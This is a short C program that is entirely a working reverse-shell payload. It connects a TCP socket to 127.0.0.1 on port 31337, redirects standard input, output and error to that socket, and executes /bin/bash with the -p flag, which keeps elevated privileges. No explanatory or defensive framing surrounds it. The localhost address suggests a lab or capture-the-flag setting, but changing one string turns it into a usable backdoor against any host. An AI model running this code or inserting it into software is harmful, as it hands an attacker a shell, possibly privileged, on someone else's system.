#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
	int sockfd;
	struct sockaddr_in in;

	char *argv[] = {"/bin/bash", "-p", NULL};

	in.sin_family = AF_INET;
	in.sin_port = htons(31337);
	in.sin_addr.s_addr = inet_addr("127.0.0.1");

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockaddr*)&in, sizeof(struct sockaddr));

	dup2(sockfd, 2);
	dup2(sockfd, 1);
	dup2(sockfd, 0);

	execve("/bin/bash", argv, NULL);
	return 0;
}
